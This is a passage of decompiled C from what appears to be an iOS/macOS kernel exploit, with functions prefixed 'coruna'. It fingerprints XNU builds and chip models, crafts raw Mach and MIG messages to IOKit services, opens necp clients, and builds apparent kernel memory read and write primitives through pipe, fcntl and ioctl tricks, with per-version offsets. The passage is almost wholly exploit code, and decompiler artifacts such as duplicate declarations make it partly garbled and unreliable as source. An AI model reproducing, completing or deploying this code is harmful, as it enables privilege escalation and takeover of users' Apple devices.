    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}





uint64_t coruna_buf_grow(long *handle,uint size)
{
  void *ptr;
  
  if ((uint)(*(int *)((long)handle + 0xc) - (int)handle[1]) < size) {
    if (0xfffffbff < size) {
      return 0xad00c;
    }
    if (*(int *)((long)handle + 0xc) == 0) {
      size = size + 0x41c;
      ptr = _calloc((unsigned long)size,1);
    }
    else {
      size = size + 0x400;
      ptr = _realloc((void *)*handle,(unsigned long)((int)handle[1] + size));
    }
    if (ptr == (void *)0x0) {
      return 0xad009;
    }
    *handle = (long)ptr;
    *(uint *)((long)handle + 0xc) = (int)handle[1] + size;
    if ((int)handle[1] == 0) {
      *(uint32_t *)(handle + 1) = 0x1c;
      return 0;
    }
  }
  return 0;
}





void coruna_kernel6544_via_buf_grow_2(long *handle,uint64_t val,uint32_t size)
{
  uint64_t *ptr;
  int err;
  
  err = coruna_buf_grow((int)handle,0x10);
  if (err == 0) {
    ptr = (uint64_t *)((unsigned long)*(uint *)(handle + 1) + *handle);
    *ptr = val;
    *(uint32_t *)(ptr + 1) = 0x2130000;
    *(uint32_t *)((long)ptr + 0xc) = size;
    *(int *)(handle + 1) = (int)handle[1] + 0x10;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}





uint64_t coruna_memcpy_1b018(long *handle,void *ctx,unsigned long arg)
{
  uint64_t u;
  
  u = coruna_buf_grow(handle,arg);
  if ((int)u == 0) {
    _memcpy((void *)((unsigned long)*(uint *)(handle + 1) + *handle),ctx,arg & 0xffffffff);
    *(int *)(handle + 1) = (int)handle[1] + (int)arg;
  }
  return u;
}





uint coruna_mach_msg(uint64_t *val,uint32_t size,uint32_t flags_2,uint32_t version_3)
{
  uint32_t u;
  int err;
  mach_msg_size_t send_size;
  uint size;
  uint version;
  uint32_t *ptr;
  
  version = 0xad001;
  if ((val != (uint64_t *)0x0) &&
     (ptr = (uint32_t *)*val, ptr != (uint32_t *)0x0)) {
    err = *(int *)(val + 2);
    u = 0x1514;
    if (err != 0) {
      u = 0x80001514;
    }
    *ptr = u;
    send_size = *(mach_msg_size_t *)(val + 1);
    ptr[1] = send_size;
    ptr[2] = flags_2;
    ptr[3] = size;
    ptr[4] = 0;
    ptr[5] = version_3;
    ptr[6] = err;
    size = _mach_msg((mach_msg_header_t *)*val,0x40001,send_size,0,0,0,0);
    version = 0;
    if (size != 0) {
      version = size | 0x80000000;
    }
  }
  return version;
}
void coruna_uname(uint64_t *val)
{
  uint64_t u;
  int err;
  char *ptr;
  char *buf;
  uint64_t size;
  uint32_t version;
  long handle;
  unsigned long port;
  int scratch [4];
  utsname scratch;
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  _uname(&scratch);
  buf = scratch.version;
  ptr = _strdup(buf);
  *val = ptr;
  scratch[0] = 0;
  scratch[1] = 0;
  scratch[2] = 0;
  scratch[3] = 0;
  ptr = _strstr(buf,"xnu-");
  err = _sscanf(ptr,"xnu-%d.%d.%d~%d");
  if (err != 4) {
    ptr = _strstr(buf,"xnu-");
    err = _sscanf(ptr,"xnu-%d.%d.%d.%d.%d~%d");
    if (err != 6) {
      size = 1;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
  handle = 0;
  port = 0;
  do {
    port = (long)*(int *)((long)scratch + handle) + port * 1000;
    handle = handle + 4;
  } while (handle != 0x10);
  val[1] = port;
  version = 0x26;
  *(uint32_t *)((long)val + 0x24) = 0x26;
  buf = _strstr(buf,"T8120");
  if (buf != (char *)0x0) {
    version = 0x2e;
  }
  *(uint32_t *)((long)val + 0x24) = version;
  if (port < 8020000000000) {
    if (port < 0x73835ab9470) {
      version = 0x68;
    }
    else {
      version = 0x58;
    }
  }
  else {
    version = 0x48;
  }
  *(uint32_t *)(val + 4) = version;
  u = k_kernel_rodata_word_3b770;
  size = 0;
  val[3] = k_kernel_rodata_word_0003b778;
  val[2] = u;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(size);
}





void coruna_ioservicegetmatchingservice(void)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = _IOServiceMatching();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,handle);
  return;
}





void coruna_mig_reply_port(mach_port_t port,uint64_t val,uint64_t id_2,uint32_t size,
                 uint32_t flags_2,void *ctx,int flags)
{
  unsigned long u;
  uint size;
  byte err;
  mach_port_t rcv_name;
  int err;
  mach_msg_return_t lm5;
  int status;
  mach_msg_header_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint32_t serial_buf;
  uint64_t scratch;
  uint64_t action;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_saved;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t path_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t tmp_buf;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  long region;
  
  region = *(long *)k_kernel_stack_chk_guard_slot;
  cache_20 = 0;
  tmp_buf = 0;
  cache_22 = 0;
  cache_21 = 0;
  frame = 0;
  path_buf = 0;
  cache = 0;
  work = 0;
  plist = 0;
  sa_new = 0;
  json_buf = 0;
  url_buf = 0;
  path_buf = 0;
  sa_saved = 0;
  region = 0;
  tmp_buf = 0;
  stack_guard = 0;
  stack_guard = 0;
  sa_new = 0;
  sa_saved = 0;
  serial_buf = 0;
  block_ctx = 0;
  block_ctx = 0;
  action = 0;
  bootargs = 0;
  action = 0;
  host_info = 0;
  thread_attr = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch.msgh_reserved = 0;
  scratch.msgh_id = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  scratch.msgh_remote_port = 0;
  scratch.msgh_local_port = 0;
  scratch.msgh_bits = 0;
  scratch.msgh_size = 0;
  rcv_name = _mig_get_reply_port();
  if (rcv_name == 0) {
    status = 0;
    err = 0;
    err = 1;
  }
  else {
    scratch.msgh_bits = 0x80001513;
    scratch.msgh_local_port = rcv_name;
    scratch.msgh_remote_port = port;
    scratch.msgh_id = (mach_msg_id_t)k_kernel_rodata_word_3b780;
    bootargs = (int)((unsigned long)k_kernel_rodata_word_3b780 >> 0x20);
    thread_attr = (int)id_2;
    host_info = (int)((unsigned long)id_2 >> 0x20);
    serial_buf = 0x1000000;
    scratch = coruna_u64_pack((flags_2), (size));
    action = coruna_u64_pack((0x140000), ((uint32_t))action);
    bootargs = *(uint64_t *)k_kernel_ndr_record_slot;
    err = ___strlcpy_chk(&host_info,val,0x80,0x80);
    size = err + 1;
    err = 0;
    if ((size & 7) != 0) {
      err = 8 - (size & 7);
    }
    size = err + size;
    thread_attr = coruna_u64_pack((size), ((uint32_t))thread_attr);
    u = (unsigned long)size;
    *(uint32_t *)((long)&host_info + u) = size;
    *(int *)((long)&host_info + u + 4) = flags;
    _memcpy((void *)((long)&block_ctx + u),ctx,(unsigned long)(uint)(flags << 3));
    lm5 = _mach_msg(&scratch,3,size + flags * 8 + 0x50,0x110,rcv_name,0,0);
    if (lm5 == 0) {
      if (scratch.msgh_id == 0xb9a) {
        if (((int)scratch.msgh_bits < 0) && (bootargs == 1)) {
          err = 1;
          err = thread_attr;
          status = 0;
        }
        else {
          err = 0;
          err = 1;
          status = host_info;
        }
      }
      else {
        err = 0;
        err = 1;
        status = -0x12d;
      }
    }
    else {
      _mig_dealloc_reply_port(rcv_name);
      err = 0;
      err = 0;
      status = 0;
    }
  }
  if (!(bool)(err & status == 0 & err != 0 & err != -1)) {
    err = 0;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == region) {
    return;
  }
  ___stack_chk_fail(err);
}





uint64_t coruna_ioservice_publish_1c3c4(uint64_t val,uint64_t id_2,mach_port_name_t *arg)
{
  uint8_t *ptr;
  mach_port_t host;
  kern_return_t lk2;
  uint64_t u;
  mach_port_name_t scratch;
  io_master_t bootargs;
  
  host = _mach_host_self();
  lk2 = _host_get_io_master(host,&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if ((lk2 == 0) &&
     (lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch),
     lk2 == 0)) {
    u = coruna_mig_reply_port(bootargs,"IOServicePublish",val,id_2,scratch,0,0);
    if ((int)u != 0) {
      *arg = scratch;
      return u;
    }
    _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  }
  return 0;
}





uint64_t coruna_ioobjectrelease(uint64_t val,int flags)
{
  int err;
  
  while( true ) {
    if (flags == 0) {
      return 0x700002d6;
    }
    err = coruna_ioservicegetmatchingservice(val);
    if (1 < err + 1U) break;
    _sleep(1);
    flags = flags + -1;
  }
  _IOObjectRelease();
  return 0;
}





bool coruna_thread_policy_set(thread_act_t arg,thread_policy_t arg_x)
{
  bool err;
  kern_return_t lk2;
  
  lk2 = _thread_policy_set(arg,2,arg_x,4);
  if (lk2 == 0) {
    lk2 = _thread_policy_set(arg,3,arg_x + 4,1);
    err = lk2 == 0;
  }
  else {
    err = false;
  }
  return err;
}





uint64_t coruna_mach_timebase_info(uint64_t val,uint size)
{
  kern_return_t lk1;
  uint64_t u;
  double ld3;
  double ld4;
  mach_timebase_info_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint64_t serial_buf;
  
  lk1 = _mach_timebase_info(&scratch);
  if (lk1 == 0) {
    ld3 = (double)NEON_ucvtf((unsigned long)scratch.denom);
    ld4 = (double)NEON_ucvtf((unsigned long)scratch.numer);
    ld3 = (ld3 / ld4) * k_kernel_rodata_word_3b788;
    bootargs = (int)(ld3 * (double)size);
    thread_attr = (int)(ld3 * 50.0);
    serial_buf = k_kernel_rodata_word_3b790;
    host_info = bootargs;
    u = coruna_thread_policy_set(val,&bootargs);
  }
  else {
    u = 0;
  }
  return u;
}





void coruna_call_mach_timebase_info(uint64_t val)
{
  coruna_mach_timebase_info(val,0x32);
  return;
}





uint64_t coruna_slot_clear(long handle,uint size)
{
  uint64_t u;
  
  u = 0xad008;
  if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
    if (0x3f < size) {
      return 0x28011;
    }
    u = 0;
    *(uint32_t *)(*(long *)(handle + 0x118) + (unsigned long)size) = 0;
  }
  return u;
}





uint64_t coruna_mach_absolute_time_1b5b4(long handle,uint size,uint flags_2)
{
  byte err;
  unsigned long u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  long handle;
  
  port = 0xad008;
  handle = *(long *)(handle + 0x118);
  if ((handle != 0) && (*(long *)(handle + 0x120) != 0)) {
    if (size < 0x40) {
      size = _mach_absolute_time();
      LOAcquire();
      err = *(byte *)(handle + (unsigned long)size);
      *(byte *)(handle + (unsigned long)size) = 1;
      LORelease();
      if ((err & 1) != 0) {
        do {
          if (flags_2 != 0) {
            version = _mach_absolute_time();
            u = 0;
            if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
              u = ((version - size) * (unsigned long)*(uint *)(handle + 0x25c)) /
                      (unsigned long)*(uint *)(handle + 0x260);
            }
            if ((unsigned long)flags_2 < u / 1000000) {
              return 0xad020;
            }
          }
          _thread_switch(0,2,1);
          LOAcquire();
          err = *(byte *)(handle + (unsigned long)size);
          *(byte *)(handle + (unsigned long)size) = 1;
          LORelease();
        } while ((err & 1) != 0);
      }
      port = 0;
    }
    else {
      port = 0x28011;
    }
  }
  return port;
}





uint coruna_close(int flags)
{
  uint u;
  int err;
  int *err;
  uint *ptr;
  
  err = _close(flags);
  u = 0;
  if (err != 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_open_dev_null(int *flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  err = _open("/dev/null",0x20);
  if (err < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    *flags = err;
  }
  return u;
}





uint64_t coruna_kernel6544_via_fd_read_full(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  long handle;
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  uint32_t host_info;
  uint32_t scratch;
  uint32_t serial_buf;
  uint32_t bootargs;
  long action;
  uint32_t block_ctx;
  
  u = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kernel6544_residual_246(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((u = coruna_open_dev_null(&block_ctx), (int)u == 0 &&
        (u = coruna_fd_drain(ptr), (int)u == 0)))) {
      scratch = 0;
      serial_buf = 0;
      bootargs = 0x10000000;
      host_info = size;
      action = addr_2;
      u = coruna_write(ptr,&host_info,0x18);
      if (((int)u == 0) && (u = coruna_fd_read_full(ptr,&scratch,0x18), (int)u == 0)) {
        if ((coruna_u64_pack((scratch), (host_info)) == scratch && coruna_u64_pack((bootargs), (serial_buf)) == bootargs)
            && action == thread_attr) {
          u = coruna_fd_read_full(&k_kernel_slot_1938 + handle,val,size);
        }
        else {
          u = 0xad014;
        }
      }
      if (flags == 0) {
        return u;
      }
    }
    coruna_close(block_ctx);
  }
  return u;
}
uint64_t coruna_kernel6544_via_write(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  long handle;
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint32_t block_ctx;
  
  u = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kernel6544_residual_246(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((u = coruna_open_dev_null(&block_ctx), (int)u == 0 &&
        (u = coruna_fd_drain(ptr), (int)u == 0)))) {
      serial_buf = k_kernel_rodata_word_0003b7a8;
      host_info = k_kernel_rodata_word_3b7a0;
      action = addr_2;
      u = coruna_write(ptr,&host_info,0x18);
      if (((int)u == 0) && (u = coruna_fd_read_full(ptr,&scratch,0x18), (int)u == 0)) {
        if ((host_info == scratch && serial_buf == bootargs) && action == thread_attr) {
          u = coruna_write(&k_kernel_slot_1938 + handle,val,size);
        }
        else {
          u = 0xad014;
        }
      }
      if (flags == 0) {
        return u;
      }
    }
    coruna_close(block_ctx);
  }
  return u;
}





void coruna_kernel6544_residual_255(long handle,uint64_t *val,long addr_2,uint64_t id_2,int flags)
{
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[2] = k_kernel_rodata_word_3b798;
  *(uint32_t *)((long)val + 0x1c) = 0;
  if ((flags == 7) && (*(long *)(handle + 0x220) != 0)) {
    val[5] = *(long *)(handle + 0x220);
    val[7] = addr_2 + 0x60;
    val[0xd] = id_2;
  }
  else {
    val[5] = addr_2 + 0x60;
    val[7] = id_2;
    *(int *)(val + 0xc) = flags;
  }
  val[8] = 0;
  *(uint8_t *)((long)val + 0x53) = 0x22;
  val[0xb] = 0;
  return;
}





void coruna_kernel6544_via_fd_read_full_2(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint u;
  int err;
  unsigned long size;
  uint8_t scratch[96];
  uint8_t bootargs[96];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  err = coruna_kernel6544_via_fcntl_1bf84_3(val,size_3,0x60,bootargs,1);
  if (err == 0) {
    size = 0x2800f;
  }
  else {
    size = coruna_write(id_2,bootargs,0x60);
    if (((int)size == 0) && (size = coruna_fd_read_full(id_2,scratch,0x60), (int)size == 0)) {
      err = _memcmp(bootargs,scratch,0x60);
      u = 0;
      if (err != 0) {
        u = 0xad014;
      }
      size = (unsigned long)u;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(size);
}





void coruna_nop_stub_6(void)
{
  coruna_kernel6544_via_fcntl_1bf84_3();
  return;
}





bool coruna_uuid_is_null(long handle)
{
  uint32_t u;
  int err;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    if (*(long *)(handle + 0x230) == 0) {
      return false;
    }
    if (*(long *)(handle + 0x228) == 0) {
      return false;
    }
    if (*(char *)(handle + 0xb) == '\0') {
      return true;
    }
    u = 0x800100;
  }
  else {
    if (((*(int *)(&k_kernel_slot_1944 + handle) == -1) ||
        (err = _uuid_is_null(&k_kernel_slot_1948 + handle), err != 0)) ||
       (*(long *)(&k_kernel_slot_1958 + handle) == 0)) {
      return false;
    }
    if (*(char *)(handle + 0xb) == '\0') {
      return true;
    }
    u = 0x8000100;
  }
  err = coruna_ctx_test_flag(handle,u);
  return err != 0;
}
unsigned long coruna_necp_open(long arg)

{
  long handle;
  uint32_t type_id_14;
  int j;
  int idx;
  uint version;
  uint64_t type_id_15;
  unsigned long port;
  long serial_13;
  uint *obj;
  int *count;
  unsigned long kind;
  uint64_t cache_43;
  int cache_44;
  long cache_45;
  long cache_21 [3];
  uint64_t action;
  long work;
  
  work = *(long *)k_kernel_stack_chk_guard_slot;
  if (*(unsigned long *)(arg + 0x158) < 0x1f530f02800000) {
    type_id_14 = *(uint32_t *)k_kernel_mach_task_self_slot;
    serial_13 = coruna_call_macho_data_seg_2bb24_2bdb4_20fac(arg,type_id_14,cache_21 + 2);
    port = 0x2800e;
    obj = (uint *)0x0;
    if (serial_13 != 0) {
      *(long *)(arg + 0x230) = serial_13;
      obj = (uint *)coruna_return_zero_2b970(arg,type_id_14);
      if (obj != (uint *)0x0) {
        port = 0;
        *(uint **)(arg + 0x228) = obj;
      }
    }
  }
  else {
    cache_21[1] = 0;
    type_id_15 = _necp_open(0);
    j = (int)type_id_15;
    if (j == -1) {
      count = ___error();
      j = *count;
      obj = (uint *)___error();
      version = -*obj;
      if (-1 < j) {
        version = *obj;
      }
      port = (unsigned long)(version | 0x40000000);
    }
    else {
      idx = _necp_client_action(type_id_15,1,cache_21 + 2,0x10,cache_21 + 1,8);
      if (idx == -1) {
        count = ___error();
        idx = *count;
        obj = (uint *)___error();
        version = -*obj;
        if (-1 < idx) {
          version = *obj;
        }
        port = (unsigned long)(version | 0x40000000);
      }
      else {
        port = coruna_kernel6544_via_ptr_canonicalize_8(arg,type_id_15,cache_21);
        if ((int)port == 0) {
          port = 0x2800f;
          idx = coruna_kernel6544_residual_256(arg,cache_21[0] + 0x18,&cache_45);
          if (idx != 0) {
            serial_13 = coruna_ptr_canonicalize(arg,cache_45);
            if (serial_13 == 0) {
              port = 0x28026;
            }
            else {
              kind = *(unsigned long *)(arg + 0x158);
              serial_13 = 0x570;
              if (kind < 0x1f541e00000000) {
                serial_13 = 0x370;
              }
              handle = 0x580;
              if (kind >> 0x2b < 1099) {
                handle = serial_13;
              }
              obj = (uint *)coruna_kernel6544_via_fcntl_1bf84_3(arg,handle + cache_45,4,&cache_44,1);
              if ((int)obj != 0) {
                if (cache_44 == 8) {
                  serial_13 = 0x578;
                  if (kind < 0x1f541e00000000) {
                    serial_13 = 0x378;
                  }
                  handle = 0x588;
                  if (kind >> 0x2b < 1099) {
                    handle = serial_13;
                  }
                  obj = (uint *)coruna_kernel6544_residual_256(arg,cache_45 + handle,&cache_43);
                  if ((int)obj != 0) {
                    obj = (uint *)coruna_ptr_canonicalize(arg,cache_43);
                    if (obj == (uint *)0x0) {
                      port = 0x28026;
                    }
                    else {
                      port = 0;
                      *(int *)(&k_kernel_slot_1944 + arg) = j;
                      *(uint64_t *)(&UNK_00001950 + arg) = action;
                      *(long *)(&k_kernel_slot_1948 + arg) = cache_21[2];
                      *(long *)(&k_kernel_slot_1958 + arg) = cache_45;
                    }
                  }
                }
                else {
                  port = 0x28011;
                }
                if (*(long *)k_kernel_stack_chk_guard_slot == work) {
                return port;
                }
                ___stack_chk_fail(obj);
              }
            }
          }
        }
      }
      version = _close(j);
      obj = (uint *)(unsigned long)version;
    }
  }
load_ok_31:
  if (*(long *)k_kernel_stack_chk_guard_slot == work) {
    return port;
  }
  ___stack_chk_fail(obj);
}





uint64_t coruna_kernel600c_via_open_dev_null(long handle)
{
  uint64_t u;
  uint32_t scratch;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0;
  }
  else {
    scratch = 0xffffffff;
    u = coruna_open_dev_null(&scratch);
    if ((int)u == 0) {
      if (*(int *)(&k_kernel_slot_1944 + handle) != -1) {
        _close(*(int *)(&k_kernel_slot_1944 + handle));
        *(uint32_t *)(&k_kernel_slot_1944 + handle) = 0xffffffff;
      }
      *(uint64_t *)(&UNK_00001950 + handle) = 0;
      *(uint64_t *)(&k_kernel_slot_1948 + handle) = 0;
      *(uint64_t *)(&k_kernel_slot_1958 + handle) = 0;
      coruna_close(scratch);
    }
  }
  return u;
}





uint32_t coruna_ioconnect_fd_setup(long handle)
{
  uint32_t u;
  
  u = 0x80000;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0x4000;
  }
  return u;
}





uint64_t coruna_return_zero_1cf78(long handle)
{
  if (((((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       (*(int *)(&k_kernel_slot_1940 + handle) == -1)) || (*(long *)(handle + 0x218) == 0)) &&
     (((*(int *)(handle + 0xe8) + 1U < 2 || (*(long *)(handle + 0xf8) == 0)) ||
      ((*(long *)(handle + 0x100) == 0 || (0x2711 < *(int *)(handle + 0x140))))))) {
    return 0;
  }
  return 1;
}





unsigned long coruna_fcntl_1bf84(long arg,long val,long n,uint m,int p)

{
  int *idx;
  int flags;
  long serial_10;
  int *i;
  uint *block;
  uint type_id_15;
  uint port;
  unsigned long tag;
  unsigned long type_id_17;
  unsigned long type_id_18;
  uint kind;
  size_t ls12;
  uint32_t cache_46;
  uint8_t cache_47[160];
  int cache_39 [42];
  long cache_32;
  
  cache_32 = *(long *)k_kernel_stack_chk_guard_slot;
  type_id_18 = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + arg) != -1)) &&
     ((*(long *)(arg + 0x218) != 0 && (serial_10 = coruna_kernel6544_residual_246(arg), serial_10 != 0)))) {
    idx = (int *)(&k_kernel_slot_1930 + arg);
    cache_46 = 0xffffffff;
    if ((p == 0) ||
       ((type_id_18 = coruna_open_dev_null(&cache_46), (int)type_id_18 == 0 &&
        (type_id_18 = coruna_fd_drain(idx), (int)type_id_18 == 0)))) {
      type_id_15 = 4;
      if (*(long *)(arg + 0x220) != 0) {
        type_id_15 = 8;
      }
      if (m != 0) {
        tag = 0;
        do {
          type_id_18 = val + tag;
          kind = m - (int)tag;
          ls12 = (size_t)kind;
          if ((((*(unsigned long *)(arg + 0x188) & type_id_18) != 0) || (kind < 0x4000)) ||
             (flags = coruna_uuid_is_null(arg), flags == 0)) {
            if (type_id_15 < kind || type_id_15 - kind == 0) {
              type_id_17 = 0;
            }
            else {
              port = 0;
              if ((((type_id_18 - 1) + ls12 ^ (type_id_18 - 1) + (unsigned long)type_id_15) &
                  (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
                port = type_id_15 - kind;
              }
              type_id_17 = (unsigned long)port;
            }
            if (*(long *)(arg + 0x220) == 0) {
              type_id_18 = coruna_kernel6544_via_fd_read_full_3(arg,type_id_18 - type_id_17);
              if ((int)type_id_18 == 0) {
                i = ___error();
                *i = 0;
                flags = _fcntl(*(int *)(&k_kernel_slot_1940 + arg),5);
                cache_39[0] = flags;
                if ((flags == -1) && (i = ___error(), *i != 0)) {
                  i = ___error();
                  flags = *i;
                  block = (uint *)___error();
                  kind = -*block;
                  if (-1 < flags) {
                    kind = *block;
                  }
                  type_id_18 = (unsigned long)(kind | 0x40000000);
                  kind = type_id_15;
                }
                else {
                  if (3 < kind) {
                    ls12 = 4;
                  }
                  _memcpy((void *)(n + tag),(void *)((long)cache_39 + type_id_17),ls12);
                  type_id_18 = 0;
                  kind = type_id_15;
                }
                coruna_kernel6544_via_fd_read_full_4(arg);
                if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
                ___stack_chk_fail();
                }
                return type_id_18;
              }
            }
            else if (((*idx == -1) || (*(int *)(&k_kernel_slot_1934 + arg) == -1)) ||
                    (*(long *)(arg + 0x218) == 0)) {
              type_id_18 = 0xad001;
            }
            else {
              cache_39[0x22] = 0;
              cache_39[0x23] = 0;
              cache_39[0x20] = 0;
              cache_39[0x21] = 0;
              cache_39[0x26] = 0;
              cache_39[0x27] = 0;
              cache_39[0x24] = 0;
              cache_39[0x25] = 0;
              cache_39[0x1a] = 0;
              cache_39[0x1b] = 0;
              cache_39[0x18] = 0;
              cache_39[0x19] = 0;
              cache_39[0x1e] = 0;
              cache_39[0x1f] = 0;
              cache_39[0x1c] = 0;
              cache_39[0x1d] = 0;
              cache_39[0x12] = 0;
              cache_39[0x13] = 0;
              cache_39[0x10] = 0;
              cache_39[0x11] = 0;
              cache_39[0x16] = 0;
              cache_39[0x17] = 0;
              cache_39[0x14] = 0;
              cache_39[0x15] = 0;
              cache_39[10] = 0;
              cache_39[0xb] = 0;
              cache_39[8] = 0;
              cache_39[9] = 0;
              cache_39[0xe] = 0;
              cache_39[0xf] = 0;
              cache_39[0xc] = 0;
              cache_39[0xd] = 0;
              cache_39[2] = 0;
              cache_39[3] = 0;
              cache_39[0] = 0;
              cache_39[1] = 0;
              cache_39[6] = 0;
              cache_39[7] = 0;
              cache_39[4] = 0;
              cache_39[5] = 0;
              coruna_kernel6544_residual_255(arg,cache_39,*(long *)(arg + 0x218),(type_id_18 - type_id_17) + -0x48,7);
              type_id_18 = coruna_write(idx,cache_39,0xa0);
              if (((int)type_id_18 == 0) &&
                 (type_id_18 = coruna_fd_read_full(idx,cache_47,0xa0), (int)type_id_18 == 0)) {
                flags = _memcmp(cache_39,cache_47,0xa0);
                if (flags == 0) {
                  flags = _ioctl(*(int *)(&k_kernel_slot_1940 + arg),0x40087367);
                  if (flags == 0) {
                    if (7 < kind) {
                      ls12 = 8;
                    }
                    _memcpy((void *)(n + tag),(void *)((long)cache_39 + type_id_17),ls12);
                    type_id_18 = 0;
                    kind = type_id_15;
                  }
                  else {
                    i = ___error();
                    flags = *i;
                    block = (uint *)___error();
                    kind = -*block;
                    if (-1 < flags) {
                      kind = *block;
                    }
                    type_id_18 = (unsigned long)(kind | 0x40000000);
                    kind = type_id_15;
                  }
                  coruna_kernel6544_via_fd_read_full_4(arg);
                  if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
                  ___stack_chk_fail();
                  }
                  return type_id_18;
                }
                type_id_18 = 0xad014;
              }
            }
load_ok_33:
            coruna_kernel6544_via_fd_read_full_4(arg);
            if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
            ___stack_chk_fail();
            }
            return type_id_18;
          }
          port = 0x80000;
          if (*(unsigned long *)(arg + 0x158) < 0x1f530f02800000) {
            port = 0x4000;
          }
          if (port <= kind) {
            kind = port;
          }
          type_id_18 = coruna_task_map_corpse_info(arg,type_id_18,n + tag,kind);
load_ok_32:
          coruna_kernel6544_via_fd_read_full_4(arg);
          if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
          ___stack_chk_fail();
          }
          return type_id_18;
        } while (kind < m);
      }
      type_id_18 = coruna_kernel6544_via_fd_read_full_4(arg);
load_ok_34:
      if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
      ___stack_chk_fail();
      }
      return type_id_18;
    }
    coruna_close(cache_46);
  }
load_ok_35:
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
    ___stack_chk_fail();
  }
  return type_id_18;
}





uint coruna_task_map_corpse_info(long handle,uint64_t val,void *ctx,uint size)
{
  long handle;
  long addr;
  long off;
  int err;
  uint u;
  uint size;
  int *err;
  uint *ptr;
  unsigned long version;
  uint64_t port;
  long base;
  uint64_t tag;
  uint64_t scratch;
  long bootargs;
  mach_vm_size_t thread_attr;
  void *host_info;
  uint64_t serial_buf;
  
  u = 0xad001;
  serial_buf = val;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
